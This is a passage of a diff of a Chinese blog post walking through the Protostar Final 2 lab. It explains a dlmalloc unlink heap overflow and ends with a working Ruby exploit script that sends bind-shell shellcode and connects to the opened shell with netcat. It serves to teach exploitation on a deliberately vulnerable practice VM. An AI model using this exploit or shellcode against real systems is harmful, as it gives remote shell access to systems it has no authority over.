+</span></span><span class="line"><span class="cl"><span class="err">→</span>  <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">+</span><span class="mh">0xc</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="mf">4.</span> <span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">FD</span>
+</span></span><span class="line"><span class="cl"><span class="err">→</span>  <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="o">+</span><span class="mh">0x8</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="err">即，当</span> <span class="n">unlink</span><span class="p">()</span> <span class="err">时，</span>
+</span></span><span class="line"><span class="cl">  <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="o">+</span><span class="mh">0xc</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span>
+</span></span><span class="line"><span class="cl">  <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="o">+</span><span class="mh">0x8</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span>
+</span></span></code></pre></div><p>这里有两个注意点：</p>
+<ol>
+<li><code>P-&gt;fd+0xc</code> = <code>P-&gt;bk</code> 所以 在<code>P-&gt;fd</code> 写地址的话要减去 <code>0xc</code></li>
+<li><code>P-&gt;bk+0x8</code> = <code>P-&gt;fd</code> 所以 <code>P-&gt;bk+0x8</code> 的位置会被 <code>unlink()</code> 写上 <code>P-&gt;fd</code> 的值，那么 shellcode 需要从 <code>P-&gt;bk+0xc</code> 开始（以及之前全部填充上 NOP（NOP: 无操作））</li>
+</ol>
+<p><img src="/p/protostar_final_2/whenunlink.png"
+	width="1340"
+	height="1032"
+	srcset="/p/protostar_final_2/whenunlink_hued83a0bb44fa474b7e07bf4e8de140d2_183652_480x0_resize_box_3.png 480w, /p/protostar_final_2/whenunlink_hued83a0bb44fa474b7e07bf4e8de140d2_183652_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="when unlink"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="129"
+		data-flex-basis="311px"
+	
+></p>
+<hr>
+<p>可以开始考虑一下 <code>P-&gt;fd</code> 和 <code>P-&gt;bk</code> 要写什么了</p>
+<p>比如把某个可怜的函数指向动态链接表里的值指向堆上的某段 shellcode&hellip;这道题里似乎只能选择这个 <code>write()</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">get_requests</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="p">......</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dll</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&#34;Process OK</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="s">&#34;Process OK</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">      <span class="n">free</span><span class="p">(</span><span class="n">destroylist</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>如果我们弄出两个堆帧，那么执行顺序是：</p>
+<ol>
+<li>write()</li>
+<li>free(chunkB)</li>
+<li>write()</li>
+<li>free(chunkA)</li>
+</ol>
+<p>在 <code>2. free(chunkB)</code> 的时候我们就已经通过 unlink 覆写了 write 指向的地址
+那么在 <code>4. free(chunkA)</code> 之前 shellcode 就已经执行了</p>
+<p>则：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mf">1.</span> <span class="n">addr</span> <span class="n">of</span> <span class="n">write</span><span class="p">()</span><span class="o">+</span><span class="mh">0xc</span> <span class="o">=</span> <span class="n">addr</span> <span class="n">of</span> <span class="n">nop</span>
+</span></span><span class="line"><span class="cl"><span class="mf">2.</span> <span class="n">addr</span> <span class="n">of</span> <span class="n">nop</span><span class="o">+</span><span class="mh">0x8</span> <span class="o">=</span> <span class="n">addr</span> <span class="n">of</span> <span class="n">write</span><span class="p">()</span>
+</span></span></code></pre></div><p>第一个堆帧在 gdb 里看起来是这样的：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x/40x 0x804e000
+</span></span><span class="line"><span class="cl">0x804e000:	0x00000000	0x00000089	0x44525346	0x41414141
+</span></span><span class="line"><span class="cl">0x804e010:	0x42424242	0x43434343	0x44444444	0x45454545
+</span></span></code></pre></div><p>4142434445 只是一堆随便的字符，先不管它</p>
+<p><code>0x804e000: 0x00000000</code>: prev_size，由于当前堆帧是第一个堆帧，所以是零</p>
+<p><code>0x804e004:	0x00000089</code>: size = 0x89<br>
+0x89 = 0b10001001，这个最后的 1bit 是用于标记前一个堆帧是否已被 free（1 表示正在使用，由于这是第一个堆帧所以这里永远都是 1 的）<br>
+0x89-1 = 0x88 = 136 = 128+8, <br>
+128: REQSZ<br>
+8: prev_size+size = 8</p>
+<p><code>0x804e008: 44525346</code>: 就是开头说过的「必须以 <code>FSRD</code> 开头，否则 break」<br>
+同时这里也是 buffer 开始的位置 (mem) 和 <code>addr of nop</code></p>
+<p><code>0x804e010: 0x42424242</code>: 这里相当于就是 <code>addr of nop+0x8</code>，前文提到过这里会被 <code>unlink()</code> 写上 <code>addr of write()</code></p>
+<p>所以 shellcode 实际是从 <code>0x804e014: 0x43434343</code> 开始</p>
+<p>即</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x/40x 0x804e000                write 指向了这里↓
+</span></span><span class="line"><span class="cl">0x804e000: <span class="m">00000000</span> <span class="p">|</span> <span class="m">00000089</span> <span class="p">|</span> F S R D <span class="p">|</span> NOPNOPNOP
+</span></span><span class="line"><span class="cl">0x804e010: NOPNOPNOP<span class="p">|</span> Shellcode................
+</span></span><span class="line"><span class="cl">              ↑这里会被写上 <span class="sb">`</span>addr of write<span class="o">()</span><span class="sb">`</span>
+</span></span></code></pre></div><hr>
+<h2 id="fake-chunk">Fake chunk</h2>
+<p>别忘了 <code>unlink()</code> 还有两个前置条件：</p>
+<ol>
+<li><code>size &gt; 0x80</code>（已满足）</li>
+<li>前一个堆帧已被 free</li>
+</ol>
+<p>第二个条件满足的方式在 <a class="link" href="/p/protostar_heap_3" >Protostar Heap Three Walkthrough</a> 有提到过：</p>
+<p>malloc 标记前一个 chunk 是否被 free 的方法是：看 <code>size</code> 的最后一个比特是否被设为零，设为零即「前一个 chunk 已被 free」</p>
+<p>这里有一个很聪明的做法&hellip;可以用负数，比如 <code>0xfffffffc</code> 即 <code>-4</code></p>
+<br>
+<p>而且这个 <code>0xfffffffc = -4</code> 能导致两个很有趣的特性：</p>
+<ol>
+<li>
+<p>不含 null byte</p>
+</li>
+<li>
+<p>malloc 计算下一个 chunk 的位置的方式是：<code>P + size</code><br>
+那么 <code>P + (-4)</code> = <code>P - 4</code>，就是说下一个 chunk 出现在了当前 chunk 的向前 4 bytes&hellip;</p>
+</li>
+</ol>
+<p><code>prev_size</code> 同理&hellip;姑且为了区分就设为 <code>0xfffffff8</code> 也就是 <code>-8</code> ，那么上一个 chunk 出现在了当前 chunk 的向后 8 bytes</p>
+<p>结果就是，我们不需要浪费堆上很多的地址，只要在很小的一段空间里就能伪造出 BK 和 FD</p>
+<p><img src="/p/protostar_final_2/fakechunk.png"
+	width="1620"
+	height="888"
+	srcset="/p/protostar_final_2/fakechunk_hub8aeba815baad8838c1ec99c6231bfb1_182879_480x0_resize_box_3.png 480w, /p/protostar_final_2/fakechunk_hub8aeba815baad8838c1ec99c6231bfb1_182879_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="fakechunk.png"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="182"
+		data-flex-basis="437px"
+	
+></p>
+<hr>
+<h2 id="expection">Expection</h2>
+<p>结合前面提到过的，本题关键在于，程序的预期是 <code>ROOT</code> 出现在 <code>/</code> 后面</p>
+<p>但如果出现在了前面的话，<code>start</code> 就会一直向前移动直到遇到上一个 <code>/</code>&hellip;.然后 <code>memmove(start, p, l)</code></p>
+<blockquote>
+<p>void *memmove(void <code>*dest</code>, const void <code>*src</code>, size_t <code>n</code>):
+The memmove() function copies <code>n</code> bytes from memory area <code>src</code> to memory area <code>dest</code>.</p>
+</blockquote>
+<p>我们想让 chunkB 的 prev_size 和 size 分别等于 -8 和 -4</p>
+<p>那么<code>0xfffffff8</code> 和 <code>0x0xfffffffc</code> 都是 4 bytes 即:</p>
+<ol>
+<li>l = 8</li>
+<li>p = &ldquo;\xf8\xff\xff\xff&rdquo; + &ldquo;\xfc\xff\xff\xff&rdquo;</li>
+<li>start 指向 prev_size 之前</li>
+</ol>
+<p>也就是：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># zzzz is padding</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># prsz = chunkB.prev_size</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># size = chunkB.size</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">← chunk A<span class="p">|</span>chunk B →                            -8<span class="p">|</span>  -4<span class="p">|</span>  fd<span class="p">|</span>  bk    
+</span></span><span class="line"><span class="cl">....<span class="p">|</span>zzz/<span class="p">|</span>prsz<span class="p">|</span>size<span class="p">|</span>FSRD<span class="p">|</span>zzzz<span class="p">|</span>....<span class="p">|</span>ROOT<span class="p">|</span>zzz/<span class="p">|</span><span class="o">====</span><span class="p">|</span><span class="o">====</span><span class="p">|</span><span class="o">====</span><span class="p">|</span><span class="o">====</span>
+</span></span><span class="line"><span class="cl">        ↑                          ↑       ↑p <span class="o">=</span> rindex<span class="o">(</span>buf, <span class="s1">&#39;/&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">        ↑                          ↑       ↑l <span class="o">=</span> strlen<span class="o">(</span>p<span class="o">)</span> <span class="o">=</span> <span class="m">9</span>
+</span></span><span class="line"><span class="cl">        ↑                          ↑start <span class="o">=</span> <span class="o">(</span>buf, <span class="s2">&#34;ROOT&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        ↑while<span class="o">(</span>*start !<span class="o">=</span> <span class="s1">&#39;/&#39;</span><span class="o">)</span> <span class="o">{</span>start--<span class="p">;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl">        ↑start              
+</span></span><span class="line"><span class="cl">                               
+</span></span><span class="line"><span class="cl">                           ↓   
+</span></span><span class="line"><span class="cl">                  memmove<span class="o">(</span>start, p, l<span class="o">)</span>
+</span></span><span class="line"><span class="cl">                           ↓  
+</span></span><span class="line"><span class="cl">                    
+</span></span><span class="line"><span class="cl">← chunk A<span class="p">|</span>chunk B →
+</span></span><span class="line"><span class="cl">....<span class="p">|</span>WWW/<span class="p">|</span>prsz<span class="p">|</span>size<span class="p">|</span>FSRD<span class="p">|</span>WWWW<span class="p">|</span>....<span class="p">|</span>ROOT<span class="p">|</span>xxx/<span class="p">|</span>fff8<span class="p">|</span>fffc
+</span></span><span class="line"><span class="cl">        /<span class="p">|</span><span class="o">====</span><span class="p">|</span><span class="o">====</span><span class="p">|</span><span class="o">====</span><span class="p">|</span><span class="o">====</span>                               
+</span></span><span class="line"><span class="cl">            -8<span class="p">|</span>  -4<span class="p">|</span>  fd<span class="p">|</span>  bk
+</span></span></code></pre></div><h2 id="implement">Implement</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@protostar:~$ objdump -R /opt/protostar/bin/final2 <span class="p">|</span> grep write
+</span></span><span class="line"><span class="cl">0804d41c R_386_JUMP_SLOT   write
+</span></span><span class="line"><span class="cl">0804d468 R_386_JUMP_SLOT   fwrite
+</span></span><span class="line"><span class="cl">user@protostar:~$
+</span></span></code></pre></div><p>最终的思路画成图：</p>
+<p><img src="/p/protostar_final_2/buf.png"
+	width="1864"
+	height="1082"
+	srcset="/p/protostar_final_2/buf_hu0e87e009b0dc38b962ac7a93257d55f0_264681_480x0_resize_box_3.png 480w, /p/protostar_final_2/buf_hu0e87e009b0dc38b962ac7a93257d55f0_264681_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="buf.png"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="172"
+		data-flex-basis="413px"
+	
+></p>
+<p>直接写成脚本吧</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/ruby</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;&gt; Enter hostname:&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">hostname</span> <span class="o">=</span> <span class="nb">gets</span><span class="o">.</span><span class="n">chomp</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">2993</span>
+</span></span><span class="line"><span class="cl"><span class="n">socket</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># tcpbindshell  (108 bytes)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># http://shell-storm.org/shellcode/files/shellcode-847.php</span>
+</span></span><span class="line"><span class="cl"><span class="no">PORTHL</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x7a\x69</span><span class="s2">&#34;</span> <span class="c1"># default is \x7a\x69 = 31337</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52\x66\x68</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="no">PORTHL</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 0xfffffff8 = -8</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0xfffffffc = -4</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x0804d41c = write_address</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x0804e014 = shellcode_address</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#chunkMetadata = [0xfffffff8].pack(&#34;I&#34;) + [0xfffffffc].pack(&#34;I&#34;) + [0x0804d41c-0xc].pack(&#34;I&#34;) + [0x0804e014].pack(&#34;I&#34;)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">chunkMetadata</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\xf8\xff\xff\xff</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\xfc\xff\xff\xff</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\x10\xd4\x04\x08</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\x08\xe0\x04\x08</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">chunkA</span> <span class="o">=</span> <span class="s2">&#34;FSRD&#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">128</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">-</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">bytesize</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">chunkB</span> <span class="o">=</span> <span class="s2">&#34;FSRD&#34;</span> <span class="o">+</span> <span class="s2">&#34;z&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">128</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">-</span> <span class="n">chunkMetadata</span><span class="o">.</span><span class="n">bytesize</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;ROOTzzz/&#34;</span> <span class="o">+</span> <span class="n">chunkMetadata</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="n">chunkA</span><span class="o">.</span><span class="n">inspect</span>
+</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="n">chunkB</span><span class="o">.</span><span class="n">inspect</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">socket</span><span class="o">.</span><span class="n">puts</span> <span class="n">chunkA</span> <span class="o">+</span> <span class="n">chunkB</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">system</span><span class="p">(</span><span class="s2">&#34;nc -v 192.168.215.129 31337&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">socket</span><span class="o">.</span><span class="n">close</span>
+</span></span></code></pre></div><p><img src="/p/protostar_final_2/host.png"
+	width="2880"
+	height="1298"
+	srcset="/p/protostar_final_2/host_huda532a72d9d7373fdbec5063b9126966_1315940_480x0_resize_box_3.png 480w, /p/protostar_final_2/host_huda532a72d9d7373fdbec5063b9126966_1315940_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="宿主机"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="221"
+		data-flex-basis="532px"
+	
+></p>
+<p><img src="/p/protostar_final_2/virtual.png"
+	width="2880"
+	height="906"
+	srcset="/p/protostar_final_2/virtual_hud37b339a6bc688fa6b63b77645e1d796_919506_480x0_resize_box_3.png 480w, /p/protostar_final_2/virtual_hud37b339a6bc688fa6b63b77645e1d796_919506_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="虚拟机"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="317"
+		data-flex-basis="762px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
 </article>
-        
+
+
+
+
+<script src="//cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js"></script>
+<div id="waline"></div>
+<script>
+    var locale = {
+        nick: '昵称',
+        nickError: '昵称的字符太少了...',
+        mail: '邮箱',
+        mailError: '邮件地址似乎不太对...',
+        link: '网址',
+        placeholder: '随意写点什么吧ww',
+        sofa: '这里还空空的...',
+        submit: 'Send!',
+        reply: '回复',
+        cancelReply: '取消回复',
+        comment: '留言',
+        more: '加载更多...',
+        preview: '预览',
+        emoji: '表情',
+        expand: '查看更多...',
+        seconds: '秒前',
+        minutes: '分钟前',
+        hours: '小时前',
+        days: '天前',
+        now: '刚刚',
+        uploading: '正在上传',
+        login: '登录',
+        logout: '退出',
+        admin: 'Admin',
+        word: '字',
+        wordHint: '评论字数应在 $0 到 $1 字之间...\n然而当前只有 $2 字x',
+    };
+
+    Waline({
+        el: '#waline',
+        serverURL: 'https://senri-blog-waline-nrt8pfbqd-kurususenri.vercel.app',
+        avatar: 'identicon',
+        login: 'enabled',
+        meta: ['nick', 'mail', 'link'],
+        placeholder: '随意写点什么吧ww',
+        locale
+    });
+</script>
+<style>
+    :root {
+         
+        --waline-font-size: 16px;
+
+         
+        --waline-white: rgb(255, 255, 255);
+        --waline-light-grey: #999;
+        --waline-dark-grey: #666;
+
+         
+        --waline-theme-color: #f7839a;
+        --waline-active-color: #55CDFC;
+
+         
+        --waline-text-color: #444;
+        --waline-bgcolor: #f7f5f1;
+        --waline-bgcolor-light: #f8f8f8;
+        --waline-border-color: #ddd;
+        --waline-disable-bgcolor: #f8f8f8;
+        --waline-disable-color: #ddd;
+
+         
+        --waline-bq-color: #f0f0f0;
+
+         
+        --waline-avatar-size: 3.25rem;
+
+         
+        --waline-badge-color: #f7839a;
+        --waline-badge-font-size: 0.775em;
+
+         
+        --waline-info-bgcolor: #f8f8f8;
+        --waline-info-color: rgb(68, 68, 68);
+        --waline-info-font-size: 0.625em;
+
+
+         
+        --waline-border: 1px solid var(--waline-border-color);
+        --waline-box-shadow: none;
+    }
+</style>
+
+    
+
+    
+
+<aside class="related-contents--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-contents">
+        <div class="flex article-list--tile">
             
-<article class="has-image">
-    <header class="article-header">
-        <div class="article-image">
-            <a href="/p/protostar_heap_3/">
-                <img src="/p/protostar_heap_3/cover_hucb530b82e8db4d6865287e2d39448560_744108_800x0_resize_box_3.png"
-                        srcset="/p/protostar_heap_3/cover_hucb530b82e8db4d6865287e2d39448560_744108_800x0_resize_box_3.png 800w, /p/protostar_heap_3/cover_hucb530b82e8db4d6865287e2d39448560_744108_1600x0_resize_box_3.png 1600w"
-                        width="800" 
-                        height="421" 
-                        loading="lazy"
-                        alt="Featured image of post Protostar Heap 3 Walkthrough" />
                 
-            </a>
-        </div>
-    
-
-    <div class="article-details">
-    
-    <header class="article-category">
+<article class="has-image">
+    <a href="/p/protostar_heap_3/">
         
-            <a href="/categories/binary/" style="background-color: #8ea885; color: #fff;">
-                Binary
-            </a>
         
-            <a href="/categories/heap/" style="background-color: #262626; color: #fff;">
-                Heap
-            </a>
-        
-    </header>
-    
-
-    <div class="article-title-wrapper">
-        <h2 class="article-title">
-            <a href="/p/protostar_heap_3/">Protostar Heap 3 Walkthrough</a>
-        </h2>
-    
-        
-        <h3 class="article-subtitle">
-            Basics of dlmalloc and unlink()
-        </h3>
-        
-    </div>
-
-    
-    <footer class="article-time">
-        
-            <div>
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
-  <circle cx="18" cy="18" r="4" />
-  <path d="M15 3v4" />
-  <path d="M7 3v4" />
-  <path d="M3 11h16" />
-  <path d="M18 16.496v1.504l1 1" />
-</svg>
-                <time class="article-time--published">Apr 07, 2022</time>
+            <div class="article-image">
+                <img src="/p/protostar_heap_3/cover.b09b45c708dcdb755a7785f3a8bfab20_hucb530b82e8db4d6865287e2d39448560_744108_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Protostar Heap 3 Walkthrough"
+                        data-key="protostar_heap_3" 
+                        data-hash="md5-sJtFxwjc23Vad4XzqL&#43;rIA==">
+                
             </div>
         
 
-        
-    </footer>
-    
-
-    
-</div>
-</header>
-</article>
-        
-            
-<article class="has-image">
-    <header class="article-header">
-        <div class="article-image">
-            <a href="/p/protostar_format_1/">
-                <img src="/p/protostar_format_1/cover_hu496a20f2b4777c05e734bfc6b70c220b_1249701_800x0_resize_box_3.png"
-                        srcset="/p/protostar_format_1/cover_hu496a20f2b4777c05e734bfc6b70c220b_1249701_800x0_resize_box_3.png 800w, /p/protostar_format_1/cover_hu496a20f2b4777c05e734bfc6b70c220b_1249701_1600x0_resize_box_3.png 1600w"
-                        width="800" 
-                        height="397" 
-                        loading="lazy"
-                        alt="Featured image of post 格式，参数，红宝石" />
-                
-            </a>
+        <div class="article-details">
+            <h2 class="article-title">Protostar Heap 3 Walkthrough</h2>
         </div>
-    
-
-    <div class="article-details">
-    
-    <header class="article-category">
+    </a>
+</article>
+            
+                
+<article class="has-image">
+    <a href="/p/protostar_format_1/">
         
-            <a href="/categories/binary/" style="background-color: #8ea885; color: #fff;">
-                Binary
-            </a>
         
-            <a href="/categories/format/" style="background-color: #0177b8; color: #fff;">
-                Format
-            </a>
-        
-            <a href="/categories/ruby/" style="background-color: #df7988; color: #fff;">
-                Ruby
-            </a>
-        
-    </header>
-    
-
-    <div class="article-title-wrapper">
-        <h2 class="article-title">
-            <a href="/p/protostar_format_1/">格式，参数，红宝石</a>
-        </h2>
-    
-        
-        <h3 class="article-subtitle">
-            Protostar Format 1 Walkthrough
-        </h3>
-        
-    </div>
-
-    
-    <footer class="article-time">
-        
-            <div>
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
-  <circle cx="18" cy="18" r="4" />
-  <path d="M15 3v4" />
-  <path d="M7 3v4" />
-  <path d="M3 11h16" />
-  <path d="M18 16.496v1.504l1 1" />
-</svg>
-                <time class="article-time--published">Mar 31, 2022</time>
+            <div class="article-image">
+                <img src="/p/protostar_format_1/cover.3055e76320895d583e5eb8b5b47454de_hu496a20f2b4777c05e734bfc6b70c220b_1249701_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post 格式，参数，红宝石"
+                        data-key="protostar_format_1" 
+                        data-hash="md5-MFXnYyCJXVg&#43;Xri1tHRU3g==">
+                
             </div>
         
 
-        
-    </footer>
-    
-
-    
-</div>
-</header>
-</article>
-        
-            
-<article class="has-image">
-    <header class="article-header">
-        <div class="article-image">
-            <a href="/p/protostar_format_0-4/">
-                <img src="/p/protostar_format_0-4/cover_hu26b9c4d780e35c305fc3142cfdfe9749_924530_800x0_resize_box_3.png"
-                        srcset="/p/protostar_format_0-4/cover_hu26b9c4d780e35c305fc3142cfdfe9749_924530_800x0_resize_box_3.png 800w, /p/protostar_format_0-4/cover_hu26b9c4d780e35c305fc3142cfdfe9749_924530_1600x0_resize_box_3.png 1600w"
-                        width="800" 
-                        height="355" 
-                        loading="lazy"
-                        alt="Featured image of post Protostar Format 0-4 Walkthrough" />
-                
-            </a>
+        <div class="article-details">
+            <h2 class="article-title">格式，参数，红宝石</h2>
         </div>
-    
-
-    <div class="article-details">
-    
-    <header class="article-category">
+    </a>
+</article>
+            
+                
+<article class="has-image">
+    <a href="/p/protostar_format_0-4/">
         
-            <a href="/categories/binary/" style="background-color: #8ea885; color: #fff;">
-                Binary
-            </a>
         
-            <a href="/categories/format/" style="background-color: #0177b8; color: #fff;">
-                Format
-            </a>
-        
-            <a href="/categories/ruby/" style="background-color: #df7988; color: #fff;">
-                Ruby
-            </a>
-        
-    </header>
-    
-
-    <div class="article-title-wrapper">
-        <h2 class="article-title">
-            <a href="/p/protostar_format_0-4/">Protostar Format 0-4 Walkthrough</a>
-        </h2>
-    
-        
-    </div>
-
-    
-    <footer class="article-time">
-        
-            <div>
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
-  <circle cx="18" cy="18" r="4" />
-  <path d="M15 3v4" />
-  <path d="M7 3v4" />
-  <path d="M3 11h16" />
-  <path d="M18 16.496v1.504l1 1" />
-</svg>
-                <time class="article-time--published">Mar 30, 2022</time>
